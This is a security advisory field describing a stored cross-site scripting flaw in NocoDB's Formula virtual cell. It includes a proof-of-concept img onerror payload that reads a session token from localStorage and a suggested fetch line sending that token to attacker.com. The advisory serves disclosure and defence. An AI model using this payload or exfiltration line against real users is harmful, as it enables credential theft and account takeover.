    "Description": "### Summary\nA stored cross-site scripting vulnerability exists within the Formula virtual cell comments functionality.\n\n### Details\nThe nc-gui/components/virtual-cell/Formula.vue displays a v-html tag with the value of \"urls\" whose contents are processed by the function replaceUrlsWithLink(). This function recognizes the pattern URI::(XXX) and creates a hyperlink tag \u003ca\u003e with href=XXX. However, it leaves all the other contents outside of the pattern URI::(XXX) unchanged, which makes the evil users can create a malicious table with a formula field whose payload is \u003cimg src=1 onerror=\"malicious javascripts\"URI::(XXX). The evil users then can share this table with others by enabling public viewing and the victims who open the shared link can be attacked.\n\n### PoC\nStep 1: Attacker login the nocodb and creates a table with two fields, \"T\" and \"F\". The type of field \"T\" is \"SingleLineText\", and the type of the \"F\" is \"Fomula\" with the formula content {T}\nStep 2: The attacker sets the contents of T using \u003cimg src=1 onerror=alert(localStorage.getItem('nocodb-gui-v2'))URI::(XXX)\nStep 3: The attacker clicks the \"Share\" button and enables public viewing, then copies the shared link and sends it to the victims\nStep 4: Any victims who open the shared link in their browsers will see the alert with their confidential tokens stored in localStorage\n\nThe attackers can use the fetch([http://attacker.com/?localStorage.getItem('nocodb-gui-v2')](http://attacker.com/?localStorage.getItem(%27nocodb-gui-v2%27))) to replace the alert and then steal the victims' credentials in their attacker.com website.\n\n### Impact\nStealing the credentials of NocoDB user that clicks the malicious link.",
